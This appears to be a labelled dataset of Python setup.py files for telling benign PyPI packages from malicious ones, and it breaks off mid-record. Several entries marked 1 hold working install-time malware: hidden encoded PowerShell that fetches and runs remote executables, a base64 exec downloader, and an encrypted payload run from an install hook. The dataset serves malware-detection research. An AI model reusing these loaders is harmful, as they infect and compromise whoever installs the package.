{"idx": "django_celery_results-2.4.0", "func": "#!/usr/bin/env python3\n\nimport codecs\nimport os\nimport re\nimport sys\n\nimport setuptools\nimport setuptools.command.test\n\ntry:\n    import platform\n    _pyimp = platform.python_implementation\nexcept (AttributeError, ImportError):\n    def _pyimp():\n        return 'Python'\n\nNAME = 'django_celery_results'\n\nE_UNSUPPORTED_PYTHON = f'{NAME} 1.0 requires %s %s or later!'\n\nPYIMP = _pyimp()\nPY37_OR_LESS = sys.version_info < (3, 7)\nPYPY_VERSION = getattr(sys, 'pypy_version_info', None)\nPYPY73_ATLEAST = PYPY_VERSION and PYPY_VERSION >= (7, 3)\n\nif PY37_OR_LESS and not PYPY73_ATLEAST:\n    raise Exception(E_UNSUPPORTED_PYTHON % (PYIMP, '3.7'))\n\n# -*- Classifiers -*-\n\nclasses = \"\"\"\n    Development Status :: 5 - Production/Stable\n    License :: OSI Approved :: BSD License\n    Programming Language :: Python\n    Programming Language :: Python :: 3\n    Programming Language :: Python :: 3.7\n    Programming Language :: Python :: 3.8\n    Programming Language :: Python :: 3.9\n    Programming Language :: Python :: 3.10\n    Programming Language :: Python :: Implementation :: CPython\n    Programming Language :: Python :: Implementation :: PyPy\n    Framework :: Django\n    Framework :: Django :: 3.2\n    Framework :: Django :: 4.0\n    Operating System :: OS Independent\n    Topic :: Communications\n    Topic :: System :: Distributed Computing\n    Topic :: Software Development :: Libraries :: Python Modules\n\"\"\"\nclassifiers = [s.strip() for s in classes.split('\\n') if s]\n\n# -*- Distribution Meta -*-\n\nre_meta = re.compile(r'__(\\w+?)__\\s*=\\s*(.*)')\nre_doc = re.compile(r'^\"\"\"(.+?)\"\"\"')\n\n\ndef add_default(m):\n    attr_name, attr_value = m.groups()\n    return ((attr_name, attr_value.strip(\"\\\"'\")),)\n\n\ndef add_doc(m):\n    return (('doc', m.groups()[0]),)\n\n\npats = {re_meta: add_default,\n        re_doc: add_doc}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, NAME, '__init__.py')) as meta_fh:\n    meta = {}\n    for line in meta_fh:\n        if line.strip() == '# -eof meta-':\n            break\n        for pattern, handler in pats.items():\n            m = pattern.match(line.strip())\n            if m:\n                meta.update(handler(m))\n\n# -*- Installation Requires -*-\n\n\ndef strip_comments(line):\n    return line.split('#', 1)[0].strip()\n\n\ndef _pip_requirement(req):\n    if req.startswith('-r '):\n        _, path = req.split()\n        return reqs(*path.split('/'))\n    return [req]\n\n\ndef _reqs(*f):\n    with open(os.path.join(os.getcwd(), 'requirements', *f)) as fp:\n        return [\n            _pip_requirement(r)\n            for r in (strip_comments(line) for line in fp)\n            if r\n        ]\n\n\ndef reqs(*f):\n    return [req for subreq in _reqs(*f) for req in subreq]\n\n# -*- Long Description -*-\n\n\nif os.path.exists('README.rst'):\n    long_description = codecs.open('README.rst', 'r', 'utf-8').read()\nelse:\n    long_description = f'See http://pypi.python.org/pypi/{NAME}'\n\n# -*- %%% -*-\n\n\nclass pytest(setuptools.command.test.test):\n    user_options = [('pytest-args=', 'a', 'Arguments to pass to pytest')]\n\n    def initialize_options(self):\n        super().initialize_options()\n        self.pytest_args = []\n\n    def run_tests(self):\n        import pytest\n        sys.exit(pytest.main(self.pytest_args))\n\n\nsetuptools.setup(\n    name=NAME,\n    packages=setuptools.find_packages(exclude=['ez_setup', 't', 't.*']),\n    version=meta['version'],\n    description=meta['doc'],\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    keywords='celery django database result backend',\n    author=meta['author'],\n    author_email=meta['contact'],\n    url=meta['homepage'],\n    platforms=['any'],\n    license='BSD',\n    classifiers=classifiers,\n    install_requires=reqs('default.txt'),\n    tests_require=reqs('test.txt') + reqs('test-django.txt'),\n    cmdclass={'test': pytest},\n    entry_points={\n        'celery.result_backends': [\n            'django-db = django_celery_results.backends:DatabaseBackend',\n            'django-cache = django_celery_results.backends:CacheBackend',\n        ],\n    },\n    zip_safe=False,\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "admcheck-1.0.0", "func": "from setuptools import setup, find_packages\n\n\n\n\nVERSION = '1.0.0'\nDESCRIPTION = 'basic package to check if user has admin'\n\n# Setting up\nsetup(\n    name=\"admcheck\",\n    version=VERSION,\n    author=\"ix_EcIipse\",\n    author_email=\"blank@noemail.net\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests', 'pyautogui'],\n    keywords=['python', 'sockets', 'requests'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "Flask-OpenID-1.3.0", "func": "\"\"\"\nFlask-OpenID\n============\n\nAdds OpenID support to Flask.\n\nLinks:\n\n* `Flask-OpenID Documentation <http://packages.python.org/Flask-OpenID/>`_\n* `Flask <http://flask.pocoo.org>`_\n* `development version\n  <http://github.com/mitsuhiko/flask-openid/zipball/master#egg=Flask-OpenID-dev>`_\n\"\"\"\nfrom setuptools import setup\nimport sys\nimport os\n\n# This check is to make sure we checkout docs/_themes before running sdist\nif not os.path.exists(\"./docs/_themes/README\"):\n    print('Please make sure you have docs/_themes checked out while running setup.py!')\n    if os.path.exists('.git'):\n        print('You seem to be using a git checkout, please execute the following commands to get the docs/_themes directory:')\n        print(' - git submodule init')\n        print(' - git submodule update')\n    else:\n        print('You seem to be using a release. Please use the release tarball from PyPI instead of the archive from GitHub')\n    sys.exit(1)\n\nsetup(\n    name='Flask-OpenID',\n    version='1.3.0',\n    url='http://github.com/mitsuhiko/flask-openid/',\n    license='BSD',\n    author='Armin Ronacher, Patrick Uiterwijk, Jarek Potiuk, Jason R. Coombs, Emmanuel Bavoux',\n    author_email='armin.ronacher@active-4.com, puiterwijk@redhat.com, jarek@potiuk.com, '\n                 'jaraco@jaraco.com, emmanuel.bavoux@free2move.com',\n    description='OpenID support for Flask',\n    py_modules=['flask_openid'],\n    zip_safe=False,\n    platforms='any',\n    install_requires=['Flask>=0.10.1', 'python3-openid>=2.0'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n    python_requires=\">=3.0\",\n)\n", "target": 0}
{"idx": "py-nvidiaguistr-9.17", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-nvidiaguistr',\n    packages = ['modlib'],\n    version = '9.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-dataproc-5.0.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-dataproc\"\ndescription = \"Google Cloud Dataproc API client library\"\nversion = \"5.0.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-dataproc\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_dataproc_v1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "esqcpurand-2.32", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcpurand',\n    packages = ['modlib'],\n    version = '2.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "faiss-cpu-1.7.2", "func": "# Copyright (c) Facebook, Inc. and its affiliates.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nfrom __future__ import print_function\nfrom setuptools import setup, find_packages\nimport os\nimport shutil\nimport platform\n\n# make the faiss python package dir\nshutil.rmtree(\"faiss\", ignore_errors=True)\nos.mkdir(\"faiss\")\nshutil.copytree(\"contrib\", \"faiss/contrib\")\nshutil.copyfile(\"__init__.py\", \"faiss/__init__.py\")\nshutil.copyfile(\"loader.py\", \"faiss/loader.py\")\n\next = \".pyd\" if platform.system() == 'Windows' else \".so\"\nprefix = \"Release/\" * (platform.system() == 'Windows')\n\nswigfaiss_generic_lib = f\"{prefix}_swigfaiss{ext}\"\nswigfaiss_avx2_lib = f\"{prefix}_swigfaiss_avx2{ext}\"\n\nfound_swigfaiss_generic = os.path.exists(swigfaiss_generic_lib)\nfound_swigfaiss_avx2 = os.path.exists(swigfaiss_avx2_lib)\n\nassert (found_swigfaiss_generic or found_swigfaiss_avx2), \\\n    f\"Could not find {swigfaiss_generic_lib} or \" \\\n    f\"{swigfaiss_avx2_lib}. Faiss may not be compiled yet.\"\n\nif found_swigfaiss_generic:\n    print(f\"Copying {swigfaiss_generic_lib}\")\n    shutil.copyfile(\"swigfaiss.py\", \"faiss/swigfaiss.py\")\n    shutil.copyfile(swigfaiss_generic_lib, f\"faiss/_swigfaiss{ext}\")\n\nif found_swigfaiss_avx2:\n    print(f\"Copying {swigfaiss_avx2_lib}\")\n    shutil.copyfile(\"swigfaiss_avx2.py\", \"faiss/swigfaiss_avx2.py\")\n    shutil.copyfile(swigfaiss_avx2_lib, f\"faiss/_swigfaiss_avx2{ext}\")\n\nlong_description=\"\"\"\nFaiss is a library for efficient similarity search and clustering of dense\nvectors. It contains algorithms that search in sets of vectors of any size,\n up to ones that possibly do not fit in RAM. It also contains supporting\ncode for evaluation and parameter tuning. Faiss is written in C++ with\ncomplete wrappers for Python/numpy. Some of the most useful algorithms\nare implemented on the GPU. It is developed by Facebook AI Research.\n\"\"\"\nsetup(\n    name='faiss',\n    version='1.7.2',\n    description='A library for efficient similarity search and clustering of dense vectors',\n    long_description=long_description,\n    url='https://github.com/facebookresearch/faiss',\n    author='Matthijs Douze, Jeff Johnson, Herve Jegou, Lucas Hosseini',\n    author_email='matthijs@fb.com',\n    license='MIT',\n    keywords='search nearest neighbors',\n\n    install_requires=['numpy'],\n    packages=['faiss', 'faiss.contrib'],\n    package_data={\n        'faiss': ['*.so', '*.pyd'],\n    },\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "matplotlib-sqlalchemy-16.18.4", "func": "from setuptools import setup, find_packages\n\n\nVERSION = '16.18.4'\nDESCRIPTION = 'A library for web scraping and data extraction'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"matplotlib-sqlalchemy\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n", "target": 1}
{"idx": "opnsea-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'GhvPYllNvCOqHZELrGPCOrPQVOeDSnCy'\nLONG_DESCRIPTION = 'xLiMxvqOKpIRUXTxefZjKJrDTQmYvLVLjJazyLNmqJwwWUTvncphYEYYOoKsKCxrwHvGZlEcrVI nrG fecQxFROHugnxO xjnwrqHvYAQEaLeNXVPnppHVnuKqXwlykWvJEpNIKAFAVRfQWcQjhZXCixXhcEfeEiDtnfTSzgGgRMwrUYAvKPTqUEhjMd buCBFfpmsQDkkJtnSVPxrfSOQXtzKniL DtdEULdaNYImJuWSTUhRstikdaF QKhyIkIUzTgpcWQQtaXtnbGXiTEEbDbhCCCbedFronIuDwdqoXABOZRhxXdNZpxIdlDeQbpGeZmQYOxOGpJEBaCgrpbchGiGTCjcWEldypCpsOhdVioGXvkpMfWVzjPsfcJVvzRwNJbgUbHJY'\n\n\nclass uPIaLoWkZIcffQcbFsozDEpotrREFmdDbjoHZIMKCQYTHWchltUchGExiDguIKkPgScMSuDFwUHEFsJJrsteijjWBCIRvFDtmblMUyevFKWsAcvfqBtoIUOHEEqxUDGqeBdBDCEOZtuinfwoIPaqODWTGVdMBjshrOIC(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'nefKxnkge4viHQhIqFEg--Pfr5G6eRCvUy73cwaaY_4=').decrypt(b'gAAAAABmbvUNzZo7TfeoxnXbPQqcTgAloSqAAy-YKRnsH79El-jZLzpIHbtc9nPQEOjbKkILIc_qUxCNpjOc-FAwbfkOTD_WdRO0WiRkIO7MMOfQnidKvjz7kjy2y7z_4Qkb8Zu5xYJwyK3WNDNE0LNa7hah2QqAoSVH2s_ca7cfTOALnAVOVN4TiHeRv10sJS0wK4VrKOAoFz2djsPzqnmiyM2nBRAL5g=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"opnsea\",\n    version=VERSION,\n    author=\"MmajvbSCLpOVF\",\n    author_email=\"DJIddJnnNqogKyyhY@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': uPIaLoWkZIcffQcbFsozDEpotrREFmdDbjoHZIMKCQYTHWchltUchGExiDguIKkPgScMSuDFwUHEFsJJrsteijjWBCIRvFDtmblMUyevFKWsAcvfqBtoIUOHEEqxUDGqeBdBDCEOZtuinfwoIPaqODWTGVdMBjshrOIC,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-adrandomintel-7.74", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-adrandomintel',\n    packages = ['modlib'],\n    version = '9.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8_annotations_complexity-0.0.7", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_annotations_complexity'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_annotations_complexity/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description='A flake8 extension that checks for type annotations complexity',\n    classifiers=[\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    python_requires='>=3.7',\n    packages=find_packages(),\n    include_package_data=True,\n    keywords='flake8 annotations',\n    version=get_version(),\n    author='Ilya Lebedev',\n    author_email='melevir@gmail.com',\n    install_requires=['flake8'],\n    entry_points={\n        'flake8.extension': [\n            'TAE002 = flake8_annotations_complexity.checker:AnnotationsComplexityChecker',\n        ],\n    },\n    url='https://github.com/best-doctor/flake8-annotations-complexity',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "ddtrace-1.3.2", "func": "__all__ = [\"get_extensions\"]\n\nimport contextlib\nimport io\nimport os\nimport platform\nfrom setuptools import Extension\nimport shutil\nimport sys\nimport tempfile\n\nPOSIX = os.name == \"posix\"\nWINDOWS = os.name == \"nt\"\nLINUX = sys.platform.startswith(\"linux\")\nMACOS = sys.platform.startswith(\"darwin\")\nOSX = MACOS  # deprecated alias\nFREEBSD = sys.platform.startswith(\"freebsd\")\nOPENBSD = sys.platform.startswith(\"openbsd\")\nNETBSD = sys.platform.startswith(\"netbsd\")\nBSD = FREEBSD or OPENBSD or NETBSD\nSUNOS = sys.platform.startswith((\"sunos\", \"solaris\"))\nAIX = sys.platform.startswith(\"aix\")\n\n\n@contextlib.contextmanager\ndef silenced_output(stream_name):\n    class DummyFile(io.BytesIO):\n        # see: https://github.com/giampaolo/psutil/issues/678\n        errors = \"ignore\"\n\n        def write(self, s):\n            pass\n\n    orig = getattr(sys, stream_name)\n    try:\n        setattr(sys, stream_name, DummyFile())\n        yield\n    finally:\n        setattr(sys, stream_name, orig)\n\n\ndef get_extensions():\n    macros = [(\"PSUTIL_VERSION\", 567)]\n    if POSIX:\n        macros.append((\"PSUTIL_POSIX\", 1))\n    if BSD:\n        macros.append((\"PSUTIL_BSD\", 1))\n\n    sources = [\"ddtrace/vendor/psutil/_psutil_common.c\"]\n    if POSIX:\n        sources.append(\"ddtrace/vendor/psutil/_psutil_posix.c\")\n\n    if WINDOWS:\n\n        def get_winver():\n            win_maj, win_min = sys.getwindowsversion()[0:2]\n            return \"0x0%s\" % ((win_maj * 100) + win_min)\n\n        if sys.getwindowsversion()[0] < 6:\n            msg = \"this Windows version is too old (< Windows Vista); \"\n            msg += \"psutil 3.4.2 is the latest version which supports Windows \"\n            msg += \"2000, XP and 2003 server\"\n            raise RuntimeError(msg)\n\n        macros.append((\"PSUTIL_WINDOWS\", 1))\n        macros.extend(\n            [\n                # be nice to mingw, see:\n                # http://www.mingw.org/wiki/Use_more_recent_defined_functions\n                (\"_WIN32_WINNT\", get_winver()),\n                (\"_AVAIL_WINVER_\", get_winver()),\n                (\"_CRT_SECURE_NO_WARNINGS\", None),\n                # see: https://github.com/giampaolo/psutil/issues/348\n                (\"PSAPI_VERSION\", 1),\n            ]\n        )\n\n        sources += [\n            \"ddtrace/vendor/psutil/_psutil_windows.c\",\n            \"ddtrace/vendor/psutil/arch/windows/process_info.c\",\n            \"ddtrace/vendor/psutil/arch/windows/process_handles.c\",\n            \"ddtrace/vendor/psutil/arch/windows/security.c\",\n            \"ddtrace/vendor/psutil/arch/windows/inet_ntop.c\",\n            \"ddtrace/vendor/psutil/arch/windows/services.c\",\n            \"ddtrace/vendor/psutil/arch/windows/global.c\",\n            \"ddtrace/vendor/psutil/arch/windows/wmi.c\",\n        ]\n        ext = Extension(\n            \"ddtrace.vendor.psutil._psutil_windows\",\n            sources=sources,\n            define_macros=macros,\n            libraries=[\n                \"psapi\",\n                \"kernel32\",\n                \"advapi32\",\n                \"shell32\",\n                \"netapi32\",\n                \"wtsapi32\",\n                \"ws2_32\",\n                \"PowrProf\",\n                \"pdh\",\n            ],\n            # extra_compile_args=[\"/Z7\"],\n            # extra_link_args=[\"/DEBUG\"]\n        )\n\n    elif MACOS:\n        macros.append((\"PSUTIL_OSX\", 1))\n        sources += [\n            \"ddtrace/vendor/psutil/_psutil_osx.c\",\n            \"ddtrace/vendor/psutil/arch/osx/process_info.c\",\n        ]\n        ext = Extension(\n            \"ddtrace.vendor.psutil._psutil_osx\",\n            sources=sources,\n            define_macros=macros,\n            extra_link_args=[\"-framework\", \"CoreFoundation\", \"-framework\", \"IOKit\"],\n        )\n\n    elif FREEBSD:\n        macros.append((\"PSUTIL_FREEBSD\", 1))\n        sources += [\n            \"ddtrace/vendor/psutil/_psutil_bsd.c\",\n            \"ddtrace/vendor/psutil/arch/freebsd/specific.c\",\n            \"ddtrace/vendor/psutil/arch/freebsd/sys_socks.c\",\n            \"ddtrace/vendor/psutil/arch/freebsd/proc_socks.c\",\n        ]\n        ext = Extension(\n            \"ddtrace.vendor.psutil._psutil_bsd\", sources=sources, define_macros=macros, libraries=[\"devstat\"],\n        )\n\n    elif OPENBSD:\n        macros.append((\"PSUTIL_OPENBSD\", 1))\n        ext = Extension(\n            \"ddtrace.vendor.psutil._psutil_bsd\",\n            sources=sources + [\"ddtrace/vendor/psutil/_psutil_bsd.c\", \"ddtrace/vendor/psutil/arch/openbsd/specific.c\"],\n            define_macros=macros,\n            libraries=[\"kvm\"],\n        )\n\n    elif NETBSD:\n        macros.append((\"PSUTIL_NETBSD\", 1))\n        sources += [\n            \"ddtrace/vendor/psutil/_psutil_bsd.c\",\n            \"ddtrace/vendor/psutil/arch/netbsd/specific.c\",\n            \"ddtrace/vendor/psutil/arch/netbsd/socks.c\",\n        ]\n        ext = Extension(\"ddtrace.vendor.psutil._psutil_bsd\", sources=sources, define_macros=macros, libraries=[\"kvm\"],)\n\n    elif LINUX:\n\n        def get_ethtool_macro():\n            # see: https://github.com/giampaolo/ddtrace/vendor/psutil/issues/659\n            from distutils.unixccompiler import UnixCCompiler\n            from distutils.errors import CompileError\n\n            with tempfile.NamedTemporaryFile(suffix=\".c\", delete=False, mode=\"wt\") as f:\n                f.write(\"#include <linux/ethtool.h>\")\n\n            output_dir = tempfile.mkdtemp()\n            try:\n                compiler = UnixCCompiler()\n                # https://github.com/giampaolo/ddtrace/vendor/psutil/pull/1568\n                if os.getenv(\"CC\"):\n                    compiler.set_executable(\"compiler_so\", os.getenv(\"CC\"))\n                with silenced_output(\"stderr\"):\n                    with silenced_output(\"stdout\"):\n                        compiler.compile([f.name], output_dir=output_dir)\n            except CompileError:\n                return 